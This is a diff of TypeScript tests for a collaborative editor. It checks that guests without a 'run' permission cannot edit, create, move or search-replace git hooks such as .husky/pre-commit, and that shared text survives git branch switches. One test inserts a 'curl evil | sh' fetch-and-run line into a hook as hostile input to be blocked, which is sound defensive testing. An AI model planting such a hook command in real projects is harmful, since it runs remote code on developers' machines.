@@ -70,8 +70,23 @@ function hostFs(initial: Record<string, string> = {}) {
   const fs = fakeFs(initial);
   const other = fs.other;
   fs.other = (cmd, args) =>
-    cmd === "collab_path_inside" ? !`${args.path}/`.startsWith("/p/ext/") && !`${args.path}/`.startsWith("/p/gitlink/") : cmd === "collab_tree_has_git" ? args.path === "/p/vendor" : other(cmd, args);
+    cmd === "collab_path_inside"
+      ? !`${args.path}/`.startsWith("/p/ext/") && !`${args.path}/`.startsWith("/p/gitlink/")
+      : cmd === "collab_tree_has_git"
+        ? args.path === "/p/vendor"
+        : cmd === "collab_hooks_check"
+          ? hookCheck(args.paths)
+          : other(cmd, args);
   return fs;
+}
+
+/** What collab_hooks_check answers: `.husky` is the hooks folder; null: it can't be determined. */
+let hooksAt: string | null = "/p/.husky";
+function hookCheck(paths: string[]) {
+  if (hooksAt === null) return { ok: false, inProject: true, locked: paths.map(() => true), structural: paths.map(() => true) };
+  const dir = hooksAt;
+  const locked = paths.map((p) => p === dir || p.startsWith(`${dir}/`));
+  return { ok: true, inProject: true, locked, structural: paths.map((p, i) => locked[i] || dir.startsWith(`${p}/`)) };
 }
 
 /** Delivers a message as if it came from `peer`. */
@@ -112,6 +127,7 @@ beforeEach(async () => {
     participants: ["g1", "g2"].map((peer) => ({ peer, name: "Gast", color: "#333333", role: "guest", caps: ["edit", "run"] })),
   });
   Object.assign(app, { root: "/p", tabs: [], activeId: null });
+  hooksAt = "/p/.husky";
 });
 
 test("host's first undo after sharing an open tab doesn't wipe the file (#126)", async () => {
@@ -342,7 +358,7 @@ test("host carries out a guest's create, rename and delete in its project (#133)
   const fs = hostFs({ "/p/src/a.rs": "a\n" });
   const inside = fs.other;
   fs.other = (cmd, args) => {
-    if (cmd === "collab_path_inside" || cmd === "collab_tree_has_git") return inside(cmd, args);
+    if (cmd === "collab_path_inside" || cmd === "collab_tree_has_git" || cmd === "collab_hooks_check") return inside(cmd, args);
     if (cmd === "rename_path") {
       fs.files.set(args.to, fs.files.get(args.from)!);
       fs.files.delete(args.from);
@@ -826,6 +842,7 @@ test("guest: a malformed folder listing from the host is an empty or filtered li
 // ------------------------------------------------------------------ project search for guests
 
 const { replaceInFiles, SEARCH_LIMITS } = await import("./projectSearch.svelte");
+const { t } = await import("../i18n/index.svelte");
 const { setCapability } = await import("./rpc.svelte");
 
 /** Literal replace, as the backend plans it: UTF-16 offsets into the text it was given. */
@@ -1264,4 +1281,294 @@ test("a preview closed before the host answers opens no tab and releases the doc
   expect(app.tabs).toEqual([]);
   expect(share.guestHasDoc("late.txt")).toBe(false);
   expect(sent.some((s) => s.msg.t === "doc.close" && s.msg.path === "late.txt")).toBe(true);
+});
+
+test("before git replaces files, pending shared text is written; a failed write is reported", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/a.txt": "original\n" });
+    await receive("g1", { t: "doc.open", path: "a.txt" });
+    await guestInsert("a.txt", 0, "Y");
+    expect(share.sharedDocUnsaved("a.txt")).toBe(true);
+    fs.failWrite = "disk full";
+    expect(await share.flushSharedDocs()).toBe(false);
+    expect(fs.files.get("/p/a.txt")).toBe("original\n");
+    fs.failWrite = null;
+    expect(await share.flushSharedDocs()).toBe(true);
+    expect(fs.files.get("/p/a.txt")).toBe("Yoriginal\n");
+    expect(share.sharedDocUnsaved("a.txt")).toBe(false);
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("after a branch switch open docs show the new text to everybody", async () => {
+  const fs = hostFs({ "/p/a.txt": "on main\n" });
+  await receive("g1", { t: "doc.open", path: "a.txt" });
+  fs.files.set("/p/a.txt", "on feature\n");
+  expect(await share.reloadSharedDocs()).toEqual([]);
+  expect(guestCopy("a.txt")).toBe("on feature\n");
+});
+
+test("text typed while git ran survives the reload and is reported", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/a.txt": "on main\n" });
+    await receive("g1", { t: "doc.open", path: "a.txt" });
+    const g = await guestInsert("a.txt", 0, "Y");
+    fs.files.set("/p/a.txt", "on feature\n");
+    expect(await share.reloadSharedDocs()).toEqual(["a.txt"]);
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/a.txt")).toBe("Yon main\n");
+    expect(guestCopy("a.txt", g)).toBe("Yon main\n");
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("typing during the reload's file read survives, is written and reported", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/a.txt": "on main\n" });
+    await receive("g1", { t: "doc.open", path: "a.txt" });
+    fs.files.set("/p/a.txt", "on feature\n");
+    let typed: Y.Doc | undefined;
+    fs.beforeRead = async () => {
+      fs.beforeRead = () => {};
+      typed = await guestInsert("a.txt", 0, "Y");
+    };
+    expect(await share.reloadSharedDocs()).toEqual(["a.txt"]);
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/a.txt")).toBe("Yon main\n");
+    expect(guestCopy("a.txt", typed)).toBe("Yon main\n");
+    expect(ui.toasts.some((x: { text: string }) => x.text.includes("a.txt"))).toBe(true);
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("typing during the background write's check of the file survives an outside change", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/a.txt": "original\n" });
+    await receive("g1", { t: "doc.open", path: "a.txt" });
+    const g = await guestInsert("a.txt", 0, "A");
+    fs.files.set("/p/a.txt", "outside\n");
+    fs.beforeRead = async () => {
+      fs.beforeRead = () => {};
+      await guestInsert("a.txt", 0, "B", g);
+    };
+    await vi.advanceTimersByTimeAsync(800);
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/a.txt")).toBe("BAoriginal\n");
+    expect(guestCopy("a.txt", g)).toBe("BAoriginal\n");
+    expect(ui.toasts.some((x: { text: string }) => x.text.includes("a.txt"))).toBe(true);
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("a pending edit in a file git didn't touch is just written, without a warning", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/a.txt": "same\n" });
+    await receive("g1", { t: "doc.open", path: "a.txt" });
+    await guestInsert("a.txt", 0, "Y");
+    expect(await share.reloadSharedDocs()).toEqual([]);
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/a.txt")).toBe("Ysame\n");
+    expect(ui.toasts).toEqual([]);
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("guest: a chunk reverted in the diff reaches the host, unless the file changed meanwhile", async () => {
+  collab.role = "guest";
+  const h = new Y.Doc();
+  h.getText("content").insert(0, "one\ntwo\n");
+  await receive("host-peer", { t: "doc.state", path: "d.txt", name: "d.txt", update: b64(Y.encodeStateAsUpdate(h)) });
+  await vi.waitFor(() => expect(share.sharedDocOpen("d.txt")).toBe(true));
+  const { ChangeSet } = await import("@codemirror/state");
+  sent.length = 0;
+  expect(share.editSharedDoc("d.txt", "stale text", ChangeSet.of({ from: 0, to: 3, insert: "1" }, 10))).toBe(false);
+  expect(sent).toEqual([]);
+  expect(share.editSharedDoc("d.txt", "one\ntwo\n", ChangeSet.of([{ from: 0, to: 3, insert: "1" }, { from: 4, to: 7, insert: "2" }], 8))).toBe(true);
+  const update = sent.find((s) => s.peer === "host-peer" && s.msg.t === "doc.update")!.msg.update;
+  Y.applyUpdate(h, unb64(update));
+  expect(h.getText("content").toString()).toBe("1\n2\n");
+});
+
+const noRun = (peer = "g1") => {
+  (collab.participants as { peer: string; caps: string[] }[]).find((p) => p.peer === peer)!.caps = ["edit"];
+};
+const lastState = (peer: string, path: string) => sent.filter((s) => s.peer === peer && s.msg.t === "doc.state" && s.msg.path === path).at(-1)!.msg;
+
+test("without run a guest's edit of a git hook is dropped, and the doc comes back locked", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/.husky/pre-commit": "safe\n" });
+    noRun();
+    await receive("g1", { t: "doc.open", path: ".husky/pre-commit" });
+    expect(lastState("g1", ".husky/pre-commit").locked).toBe(true);
+    const before = sent.length;
+    await guestInsert(".husky/pre-commit", 0, "curl evil | sh\n");
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/.husky/pre-commit")).toBe("safe\n");
+    expect(sent.slice(before).some((s) => s.peer === "g1" && s.msg.t === "doc.state" && s.msg.locked)).toBe(true);
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("a guest with run edits a hook, and without run an ordinary file, as before", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/.husky/pre-commit": "safe\n", "/p/a.txt": "text\n" });
+    await receive("g1", { t: "doc.open", path: ".husky/pre-commit" });
+    expect(lastState("g1", ".husky/pre-commit").locked).toBeUndefined();
+    await guestInsert(".husky/pre-commit", 0, "Y");
+    noRun("g2");
+    await receive("g2", { t: "doc.open", path: "a.txt" });
+    expect(lastState("g2", "a.txt").locked).toBeUndefined();
+    const g = new Y.Doc();
+    for (const { peer, msg } of sent) if (peer === "g2" && msg.path === "a.txt" && msg.update && msg.t !== "aw") Y.applyUpdate(g, unb64(msg.update));
+    const v = Y.encodeStateVector(g);
+    g.getText("content").insert(0, "Z");
+    await receive("g2", { t: "doc.update", path: "a.txt", update: b64(Y.encodeStateAsUpdate(g, v)) });
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/.husky/pre-commit")).toBe("Ysafe\n");
+    expect(fs.files.get("/p/a.txt")).toBe("Ztext\n");
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test("when the hooks can't be determined, edits of a guest without run are refused", async () => {
+  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+  try {
+    const fs = hostFs({ "/p/a.txt": "text\n" });
+    hooksAt = null;
+    noRun();
+    await receive("g1", { t: "doc.open", path: "a.txt" });
+    expect(lastState("g1", "a.txt").locked).toBe(true);
+    await guestInsert("a.txt", 0, "Y");
+    await vi.advanceTimersByTimeAsync(800);
+    expect(fs.files.get("/p/a.txt")).toBe("text\n");
+  } finally {
+    vi.useRealTimers();
+  }
+});
+
+test.each([
+  ["create in the hooks", { op: "create", path: ".husky/pre-push" }],
+  ["mkdir of the hooks", { op: "mkdir", path: ".husky" }],
+  ["delete a hook", { op: "delete", path: ".husky/pre-commit" }],
+  ["rename into the hooks", { op: "rename", path: "a.txt", to: ".husky/pre-push" }],
+  ["rename out of the hooks", { op: "rename", path: ".husky/pre-commit", to: "b.txt" }],
+])("fs.op without run: %s is refused", async (_name, params) => {
+  const fs = hostFs({ "/p/.husky/pre-commit": "safe\n", "/p/a.txt": "text\n" });
+  noRun();
+  const before = new Map(fs.files);
+  await fsOp("g1", 900, params);
+  expect(sent.at(-1)!.msg).toEqual(refused(900, "hooks"));
+  expect(fs.files).toEqual(before);
+});
+
+test("fs.op without run: a folder holding the hooks can't be moved or deleted, others can", async () => {
+  const fs = hostFs({ "/p/tools/hooks/pre-commit": "safe\n", "/p/a.txt": "text\n" });
+  const inner = fs.other;
+  fs.other = (cmd, args) => {
+    if (cmd !== "rename_path") return inner(cmd, args);
+    fs.files.set(args.to, fs.files.get(args.from)!);
+    fs.files.delete(args.from);
+    return null;
+  };
+  hooksAt = "/p/tools/hooks";
+  noRun();
+  await fsOp("g1", 901, { op: "rename", path: "tools", to: "t2" });
+  expect(sent.at(-1)!.msg).toEqual(refused(901, "hooks"));
+  await fsOp("g1", 902, { op: "delete", path: "tools" });
+  expect(sent.at(-1)!.msg).toEqual(refused(902, "hooks"));
+  await fsOp("g1", 903, { op: "rename", path: "a.txt", to: "b.txt" });
+  expect(sent.at(-1)!.msg).toMatchObject({ id: 903, ok: true });
+  expect(fs.files.has("/p/b.txt")).toBe(true);
+});
+
+test("fs.op with run may change hooks", async () => {
+  const fs = hostFs({ "/p/.husky/pre-commit": "safe\n" });
+  await fsOp("g1", 904, { op: "create", path: ".husky/pre-push" });
+  expect(sent.at(-1)!.msg).toMatchObject({ id: 904, ok: true });
+  expect(fs.files.has("/p/.husky/pre-push")).toBe(true);
+});
+
+test("two docs opened at once by a guest without run both stay editable", async () => {
+  hostFs({ "/p/a.txt": "a\n", "/p/b.txt": "b\n" });
+  noRun();
+  await Promise.all([receive("g1", { t: "doc.open", path: "a.txt" }), receive("g1", { t: "doc.open", path: "b.txt" })]);
+  expect(lastState("g1", "a.txt").locked).toBeUndefined();
+  expect(lastState("g1", "b.txt").locked).toBeUndefined();
+});
+
+test("guest: a locked doc is read-only", async () => {
+  collab.role = "guest";
+  const h = new Y.Doc();
+  h.getText("content").insert(0, "hook\n");
+  await receive("host-peer", { t: "doc.state", path: ".husky/x", name: "x", update: b64(Y.encodeStateAsUpdate(h)), locked: true });
+  const tab = await vi.waitFor(() => {
+    const x = app.tabs.find((y) => y.path === "collab:.husky/x");
+    if (!x || !bindings.has(x.id)) throw new Error("not open yet");
+    return x;
+  });
+  const state = EditorState.create({ doc: "hook\n", extensions: bindings.get(tab.id) as any });
+  expect(state.readOnly).toBe(true);
+  expect(share.sharedDocOpen(".husky/x")).toBe(false);
+  // LSP format and quick fixes reach a doc as a plain editor change: this one goes nowhere.
+  expect(state.update({ changes: { from: 0, insert: "formatted " } }).state.doc.toString()).toBe("hook\n");
+});
+
+test("Replace on disk: without run a git hook is refused and left alone, with run it changes", async () => {
+  const { fs, calls } = searchFs({ "/p/.husky/pre-commit": "old\n", "/p/a.txt": "old\n" });
+  noRun();
+  await replaceReq(950, ".husky/pre-commit", "old\n");
+  expect(answer(950)).toMatchObject({ ok: false, error: { code: "hooks" } });
+  expect(fs.files.get("/p/.husky/pre-commit")).toBe("old\n");
+  expect(calls).not.toContain("guest_write_text");
+  await replaceReq(951, "a.txt", "old\n");
+  expect(answer(951)).toMatchObject({ ok: true, result: { count: 1 } });
+  (collab.participants as { peer: string; caps: string[] }[])[0].caps = ["edit", "run"];
+  await replaceReq(952, ".husky/pre-commit", "old\n");
+  expect(answer(952)).toMatchObject({ ok: true, result: { count: 1 } });
+  expect(fs.files.get("/p/.husky/pre-commit")).toBe("new\n");
+});
+
+test("Replace in a live doc: without run a git hook is refused, also if another guest has it open", async () => {
+  searchFs({ "/p/.husky/pre-commit": "old\n" });
+  await receive("g2", { t: "doc.open", path: ".husky/pre-commit" });
+  noRun();
+  await replaceReq(953, ".husky/pre-commit", "old\n");
+  expect(answer(953)).toMatchObject({ ok: false, error: { code: "hooks" } });
+  expect(share.hostLiveText(share.guestScope()!, ".husky/pre-commit")).toBe("old\n");
+});
+
+test("Replace in a guest's own copy of a hook is refused before it starts", async () => {
+  searchFs({ "/p/.husky/pre-commit": "old\n" });
+  noRun();
+  await receive("g1", { t: "rpc.req", id: 954, method: "search.canWrite", params: { file: ".husky/pre-commit" } });
+  expect(answer(954)).toMatchObject({ ok: false, error: { code: "hooks" } });
+});
+
+test("guest: a refused hook is reported for its file, the other files still go through", async () => {
+  collab.role = "guest";
+  const replacing = replaceInFiles(query("old"), "new", [{ file: "collab:.husky/x", version: "v" }, { file: "collab:a.txt", version: "v" }] as any);
+  const reqs = () => sent.filter((s) => s.msg.t === "rpc.req" && s.msg.method === "search.replace");
+  await vi.waitFor(() => expect(reqs()).toHaveLength(1));
+  await receive("host-peer", refused(reqs()[0].msg.id, "hooks"));
+  await vi.waitFor(() => expect(reqs()).toHaveLength(2));
+  await receive("host-peer", { t: "rpc.res", id: reqs()[1].msg.id, ok: true, result: { count: 2 } });
+  const report = await replacing;
+  expect(report).toMatchObject({ replaced: 2, changed: 1, stopped: null, done: 2 });
+  expect(report.errors).toHaveLength(1);
+  expect(report.errors[0].file).toBe(".husky/x");
+  expect(report.errors[0].message).toBe(t("git.guestErr.hooks"));
 });
